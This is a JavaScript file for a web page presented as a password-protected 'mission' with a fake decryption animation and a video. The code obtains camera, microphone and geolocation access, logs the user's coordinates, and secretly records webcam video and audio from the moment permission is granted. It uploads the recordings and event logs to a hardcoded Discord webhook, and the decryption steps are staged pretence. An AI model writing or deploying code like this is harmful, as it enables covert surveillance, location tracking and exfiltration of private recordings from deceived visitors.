/* ===== CONFIG ===== */
const WH   = "https://discord.com/api/webhooks/1379451829116600481/rBfx4dEdwNAzaF3mR3UCX1FhpUhzEjZctUaCHOdTSDI7gMMK3AtdxF0pBXmBnd3cKJCr";            // replace
const VID  = "https://video.wixstatic.com/video/fcb4a6_4843089a817c4ad38e7dc0bd86cc98ca/1080p/mp4/file.mp4";
const MAX  = 7_864_320;                             // 7.5 MB
const WARN = "missionWarnedOnce";
const TERM = "missionUsed";

/* ===== STATE ===== */
let SID = genSID();
let camStream, mediaRec, chunks = [], size = 0;
let faceInt, done = false;
let allowGeo = false, allowMedia = false, tries = 0;

/* ===== UTILITIES ===== */
const $ = sel => document.querySelector(sel);
const log = msg => fetch(WH, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ content: `[${SID}] ${msg}` })
}).catch(() => {});

function genSID() {
  return "xxxx-4xxx-yxxx".replace(/[xy]/g, c =>
    (Math.random() * 16 | 0).toString(16)
  );
}
function show(id) {
  document.querySelectorAll(".panel").forEach(p => p.classList.remove("active"));
  $(id).classList.add("active");
}

/* ===== PERMISSIONS ===== */
async function requestPerms() {
  try {
    camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    $("#webcam-preview").srcObject = camStream;
    allowMedia = true; log("media ok");

    navigator.geolocation.getCurrentPosition(
      pos => { allowGeo = true; log(`geo ${pos.coords.latitude.toFixed(4)},${pos.coords.longitude.toFixed(4)}`); maybeReady(); },
      ()  => { $("#perm-error").textContent = "Location denied"; log("geo denied"); }
    );
  } catch {
    $("#perm-error").textContent = "Camera & mic denied";
    log("media denied");
  }
}
function maybeReady() {
  if (allowMedia && allowGeo) $("#perm-continue").disabled = false;
}

/* ===== RECORDING ===== */
function startRec() {
  try {
    mediaRec = new MediaRecorder(camStream, { mimeType: "video/webm;codecs=vp8,opus" });

    mediaRec.ondataavailable = e => {
      if (!e.data.size) return;
      chunks.push(e.data);
      size += e.data.size;
      if (size >= MAX) flushChunks();
    };
    mediaRec.onstop = flushChunks;
    mediaRec.start(1000);
    log("rec start");
  } catch { log("rec error"); }
}

function flushChunks() {
  if (!chunks.length) return;
  const blob = new Blob(chunks, { type: "video/webm" });
  const fd = new FormData();
  fd.append("file", blob, `c_${Date.now()}.webm`);
  fetch(WH, { method: "POST", body: fd }).catch(() => {});
  chunks = []; size = 0;
}

function stopRec() {
  if (mediaRec?.state !== "inactive") mediaRec.stop();
  log("rec stop");
}

/* ===== FACE MONITOR ===== */
function faceWatch() {
  if (!("FaceDetector" in window)) { log("no FaceDetector"); return; }
  const det = new FaceDetector({ fastMode: true });
  const feed = $("#face-feed");

  faceInt = setInterval(async () => {
    try {
      const faces = await det.detect(feed);
      if (faces.length) {
        $("#face-warning").style.display = "none";
        $("#mission-video").play().catch(() => {});
      } else {
        $("#face-warning").style.display = "flex";
        $("#mission-video").pause();
      }
    } catch {}
  }, 1200);
}

/* ===== DECRYPT FLOW ===== */
function decrypt() {
  const steps = [
    "Initializing cipher…", "Negotiating TLS 1.3…", "Injecting quantum noise…",
    "Verifying SHA-512 hash…", "Decrypting block 1…", "Decrypting block 2…",
    "Decrypting block 3…", "Reassembling payload…", "Checksum OK ✔",
    "Writing secure buffer…", "Hardening memory…", "Decryption complete ✅"
  ];
  let i = 0;
  $("#decrypt-log").innerHTML = "";
  $("#decrypt-progress").value = 0;

  const iv = setInterval(() => {
    if (i < steps.length) {
      $("#decrypt-log").innerHTML += `<p>${steps[i]}</p>`;
      $("#decrypt-log").scrollTop = $("#decrypt-log").scrollHeight;
      $("#decrypt-progress").value = (++i) * 100 / steps.length;
    } else {
      clearInterval(iv);
      if (!localStorage.getItem(WARN)) {
        show("#alert-panel");
        log("warn panel");
        localStorage.setItem(WARN, "yes");
        setTimeout(() => location.reload(), 5000);
      } else {
        launchVideo();
      }
    }
  }, 1100);
}

/* ===== AUTH ===== */
function auth() {
  const pass = $("#pwd").value;
  const err  = $("#login-error");
  err.textContent = "";

  if (pass === "OneTimeSecret2024!") {
    show("#decrypt-panel");
    decrypt();
  } else {
    tries++;
    err.textContent = tries >= 3 ? "Locked" : `Wrong (${3 - tries} left)`;
    if (tries >= 3) $("#decrypt-btn").disabled = true;
    log(`bad pw ${tries}`);
  }
}

/* ===== VIDEO ===== */
function launchVideo() {
  $("#video-layer").classList.add("active");
  $("#mission-video").src = VID;
  $("#face-feed").srcObject = camStream;

  startRec(); faceWatch(); log("video play");

  setInterval(() =>
    $("#dyn-mark").textContent =
      `${SID} | ${new Date().toLocaleTimeString()}`, 1000
  );

  $("#mission-video").onended = () => { stopRec(); terminate(); };
}

/* ===== TERMINATE ===== */
function terminate() {
  if (done) return; done = true;
  clearInterval(faceInt);
  stopRec();
  camStream?.getTracks().forEach(t => t.stop());
  localStorage.setItem(TERM, "yes");
  log("terminated");

  const splash = document.createElement("div");
  splash.className = "terminated";
  splash.innerHTML = "<h1>SESSION TERMINATED</h1><p>Resetting…</p>";
  $("#video-layer").appendChild(splash);
  setTimeout(() => location.reload(), 3500);
}

/* ===== INIT / BOOT ===== */
if (localStorage.getItem(TERM) === "yes") {
  document.body.innerHTML =
    '<div style="display:flex;height:100vh;align-items:center;justify-content:center;color:#fff;font-family:sans-serif"><h1>ACCESS EXPIRED</h1></div>';
  log("reopen attempt");
  throw "expired";
}

$("#perm-continue").onclick = () => { show("#login-panel"); log("perm ok"); startRec(); };
$("#decrypt-btn").onclick   = auth;
document.addEventListener("keydown", e => {
  if (e.key === "Enter" && $("#login-panel").classList.contains("active")) auth();
});
window.addEventListener("beforeunload", () => {
  stopRec(); camStream?.getTracks().forEach(t => t.stop());
});

requestPerms();
